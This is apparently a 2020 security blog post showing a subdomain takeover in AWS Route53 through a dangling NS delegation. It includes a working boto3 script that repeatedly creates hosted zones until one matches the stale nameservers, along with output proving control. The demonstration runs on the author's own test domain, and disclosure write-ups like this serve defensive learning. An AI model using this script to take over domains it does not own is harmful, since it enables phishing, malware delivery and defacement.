---
layout: post
title: DNS Hijacking and SubDomain Takeover.
date: "2020-03-09"
---

# DNS Hijacking a Cloud Provider.

Little is discussed around the nature of DNS hijacking and methods to protect and prevent against these types of attacks. While they are somewhat uncommon they are possible in certain circumstances.

DNS Hijacking can occur in several ways inside a cloud provider environment we will discuss both techniques but take a deeper dive in the DNS based approach.
1) Hijacking a Subdomain allocated to an Elastic IP address that has been released but not deallocated or dereferenced from DNS.
2) Hijacking the delegation set on a Zone record that has yet to be set or was orphaned from a hosted zone.

Lets start with a basic Zone configuration. You will notice we have two configured.

{{< highlight json >}}
{
  "ResponseMetadata": {
    "RequestId": "bf748377-2d28-4cb0-a083-2e59893d4a09",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "x-amzn-requestid": "bf748377-2d28-4cb0-a083-2e59893d4a09",
      "content-type": "text/xml",
      "content-length": "1075",
      "date": "Mon, 09 Mar 2020 21:24:27 GMT"
    },
    "RetryAttempts": 0
  },
  "HostedZones": [
    {
      "Id": "/hostedzone/ZXMG2Y75QXFTA",
      "Name": "twestdev.com.",
      "CallerReference": "447E09A2-A839-05FF-9EC0-79C2A92642D3",
      "Config": {
        "PrivateZone": false
      },
      "ResourceRecordSetCount": 6
    },
    {
      "Id": "/hostedzone/Z2UGQDVTG9409L",
      "Name": "test.twestdev.com.",
      "CallerReference": "2020-03-09 14:17:39.891332",
      "Config": {
        "Comment": "string",
        "PrivateZone": false
      },
      "ResourceRecordSetCount": 2
    }
  ],
  "IsTruncated": false,
  "MaxItems": "100"
}
{{< /highlight >}}

In Route53 we set up zone delegation from twestdev.com using NS records for test.twestdev.com that point to the new hosted zones we created.
Amazon generates these nameservers dynamically, the key here being: along with the zone file. According to AWS's official documentation, the nameserver & zone data, will only be valid for the hosted zone. This means that no other hosted zones in route53 can use these nameservers delegations once they are set up. However, this concept can be exploited as discussed below.

Taking a look at our Primary Zone records you will see zone delegation is set up.
{{< highlight json >}}
{
      "Name": "test.twestdev.com.",
      "Type": "NS",
      "TTL": 300,
      "ResourceRecords": [
        {
          "Value": "ns-364.awsdns-45.com."
        },
        {
          "Value": "ns-625.awsdns-14.net."
        },
        {
          "Value": "ns-2045.awsdns-63.co.uk."
        },
        {
          "Value": "ns-1101.awsdns-09.org."
        }
      ]
}
{{< /highlight >}}

Great so now if we create a Record in the new hosted Zone it should have zone delegation and be able to reply to the DNS request.

JSON used to create record using AWS CLI:
{{< highlight json >}}
{
	"Comment": "",
	"Changes": [{
		"Action": "CREATE",
		"ResourceRecordSet": {
			"Name": "hi.test.twestdev.com",
			"Type": "TXT",
			"TTL": 60,
			"ResourceRecords": [{
				"Value": "\"@helloworld\""
			}]
		}
	}]
}
{{< /highlight >}}

Status:
{{< highlight json >}}
{
    "ChangeInfo": {
        "Id": "/change/C048704510OFKBBIH5SVY",
        "Status": "PENDING",
        "SubmittedAt": "2020-03-09T21:55:27.791Z",
        "Comment": ""
    }
}
{{< /highlight >}}
Results:
{{< highlight bash >}}
dig +short TXT hi.test.twestdev.com
"@helloworld"
{{< /highlight >}}

So now that we are all set up, lets try to execute this attack. For it to work correctly the Zone delegation must be misconfigured. As I originally stated, this is only possible under certain circumstances. The main reason this happens is due to stale references such as stale NS records that point to nameservers that are not active for the hosted zone.

First lets, on purpose, remove the name records (essentially deprovision the Zone).

Command:
{{< highlight python >}}
response = client.delete_hosted_zone(
    Id='/hostedzone/Z2UGQDVTG9409L'
)
{{< /highlight >}}
Response:
{{< highlight json >}}
{'ResponseMetadata': {'RequestId': 'f18f407a-85b7-48a1-a553-e6ea1a8fa2f1', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': 'f18f407a-85b7-48a1-a553-e6ea1a8fa2f1', 'content-type': 'text/xml', 'content-length': '267', 'date': 'Mon, 09 Mar 2020 22:08:01 GMT'}, 'RetryAttempts': 0}, 'ChangeInfo': {'Id': '/change/C06004932TWG0FZEUHNMW', 'Status': 'PENDING', 'SubmittedAt': datetime.datetime(2020, 3, 9, 22, 8, 1, 535000, tzinfo=tzutc())}}
{{< /highlight >}}

Now what happens if we recreate another Zone under test.twestdev.com but reference the already set NameServers and SOA? Well it's not just that simple. In fact that is what I first tried to do, this wont work.

This is because Zone Data for the Hosted zone is dynamically generated for the NameServer Pool.

Amazon generates the respective zones files for the Nameservers when they are first spun up and mapped to our zone. So we cant just create a zone and then change the nameservers to what our dangling records are pointing to.

In order to assure that the respective zone files are set to be delegated correctly, we need to ensure that when we submit the Zone creation request that the Authoritative nameserver matches what was originally set in the dangling DNS record.

In other words, it has to be brute forced. We can do this by utilizing a simple python script to do the dirty work for us.

Script:
{{< highlight python >}}
import boto3, json, datetime, time, sys

client = boto3.client('route53')

targets = ["ns-364.awsdns-45.com","ns-625.awsdns-14.net","ns-2045.awsdns-63.co.uk","ns-1101.awsdns-09.org"]
target_domain = 'test.twestdev.com.'

def cleanup():
    js = client.list_hosted_zones()
    to_delete = []
    for i in js['HostedZones']:
        if i['Name'] == target_domain:
            to_delete.append(i['Id'])
    print("Deleting Oraphaned Zones.")
    for zone in to_delete:
        try:
            res = client.delete_hosted_zone(Id=zone)
            print("Deleted Zone:" + str(zone))
        except:
            print("Couldnt Delete Zone: " + str(zone))
            continue

count = 1
while True:
    print("Searching for NameServer match. Try #" + str(count))
    try:
        response = client.create_hosted_zone(
        Name=target_domain,
        CallerReference=str(datetime.datetime.now()),
        HostedZoneConfig={
          'Comment': 'tdubz',
          'PrivateZone': False
        }
        )
        nameservers=response['DelegationSet']['NameServers']
        print("Created Resource",response['HostedZone']['Id'],nameservers)
        for server in targets:
            if server in nameservers:
                print("Done!")
                print("Created Hosted Zone.")
                print(response['HostedZone'])
                sys.exit()
        else:
            count += 1
            cleanup()
    except Exception as e:
        print("Ran into Exception creating DNS server, ReTrying.")
        print("Exception: " + str(e))
        cleanup()
        continue
{{< /highlight >}}

The script may take a while, it took me around ~46 tries before I got a nameserver delegated to the zone that matches one of the servers set in the NS record.

It may take you longer depending on luck, id say on average probably around ~300 tries.

Script Output:
{{< highlight bash >}}
Searching for NameServer match. Try #44
Created Resource /hostedzone/Z3FPRRZ2KHWS59 ['ns-1710.awsdns-21.co.uk', 'ns-1077.awsdns-06.org', 'ns-480.awsdns-60.com', 'ns-708.awsdns-24.net']
Deleting Oraphaned Zones.
Deleted Zone:/hostedzone/Z3FPRRZ2KHWS59
Searching for NameServer match. Try #45
Created Resource /hostedzone/Z1C0A4QS1XYI36 ['ns-1072.awsdns-06.org', 'ns-111.awsdns-13.com', 'ns-1631.awsdns-11.co.uk', 'ns-1003.awsdns-61.net']
Deleting Oraphaned Zones.
Deleted Zone:/hostedzone/Z1C0A4QS1XYI36
Searching for NameServer match. Try #46
Created Resource /hostedzone/Z3RE92J5ZE7JFN ['ns-625.awsdns-14.net', 'ns-1492.awsdns-58.org', 'ns-233.awsdns-29.com', 'ns-1797.awsdns-32.co.uk']
Done!
Created Hosted Zone.
{'Id': '/hostedzone/Z3RE92J5ZE7JFN', 'Name': 'test.twestdev.com.', 'CallerReference': '2020-03-09 18:42:40.146682', 'Config': {'Comment': 'tdubz', 'PrivateZone': False}, 'ResourceRecordSetCount': 2}
{{< /highlight >}}

With the hard work done, we can now create a new TXT record as part of the POC to show we have taken over the domain successfully.

Im going to create the pwned subdomain to prove the attack was successful.

JSON used to create record using AWS CLI:
{{< highlight json >}}
{
	"Comment": "",
	"Changes": [{
		"Action": "CREATE",
		"ResourceRecordSet": {
			"Name": "pwned.test.twestdev.com",
			"Type": "TXT",
			"TTL": 60,
			"ResourceRecords": [{
				"Value": "\"@pwned\""
			}]
		}
	}]
}
{{< /highlight >}}

And confirming our text record shows up...

Results:
{{< highlight bash >}}
dig +short TXT pwned.test.twestdev.com
"@pwned"
{{< /highlight >}}

What does this mean? Well this means that if an attacker is able to find a dangling NS record set in DNS they can theoretically take control of the affected domain.

This can be used to trick users, launch malware attacks as well as defame the Domain owner. These are all very serious vulnerabilities High if not Critical.

The way to prevent this type of attack is to ensure best practices and sanitization when working with DNS records.
